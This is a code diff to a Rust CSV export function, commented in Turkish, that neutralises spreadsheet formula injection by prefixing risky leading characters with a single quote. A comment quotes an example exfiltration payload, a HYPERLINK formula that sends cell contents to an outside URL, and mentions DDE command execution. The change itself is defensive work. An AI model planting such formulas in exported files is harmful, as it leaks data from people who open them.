@@ -36,15 +36,31 @@ fn status_label(status: &str) -> &'static str {
 }
 
 /// Alanı gerektiğinde tırnak içine alır ve içindeki tırnakları ikiler.
+/// Elektronik tablonun formül başlangıcı saydığı karakterler.
+///
+/// Excel, LibreOffice ve Sheets bunlarla başlayan bir hücreyi hesaplar. Ad ya
+/// da not alanına `=HYPERLINK("http://...&"&A1)` yazan biri, dosyayı açan
+/// antrenörün makinesinde o formülü çalıştırır; DDE yükleriyle bu komut
+/// çalıştırmaya kadar gider. CSV tırnağı bunu engellemez: tırnak yalnızca
+/// ayrıştırma içindir, hücrenin değeri yine `=` ile başlar.
+const FORMULA_STARTERS: [char; 6] = ['=', '+', '-', '@', '\t', '\r'];
+
 fn csv_field(value: &str) -> String {
-    let needs_quotes = value.contains(CSV_SEPARATOR)
-        || value.contains('"')
-        || value.contains('\n')
-        || value.contains('\r');
+    // Tek tırnak, hücreyi metin olarak işaretler ve görüntüde gösterilmez.
+    // Telefon alanı için ayrıca faydalı: `+905551112233` artık bozulmadan kalır.
+    let escaped = match value.chars().next() {
+        Some(first) if FORMULA_STARTERS.contains(&first) => format!("'{value}"),
+        _ => value.to_string(),
+    };
+    let needs_quotes = escaped.contains(CSV_SEPARATOR)
+        || escaped.contains('"')
+        || escaped.contains('\n')
+        || escaped.contains('\r')
+        || escaped.starts_with('\'');
     if !needs_quotes {
-        return value.to_string();
+        return escaped;
     }
-    format!("\"{}\"", value.replace('"', "\"\""))
+    format!("\"{}\"", escaped.replace('"', "\"\""))
 }
 
 fn local_date(timestamp: i64) -> String {
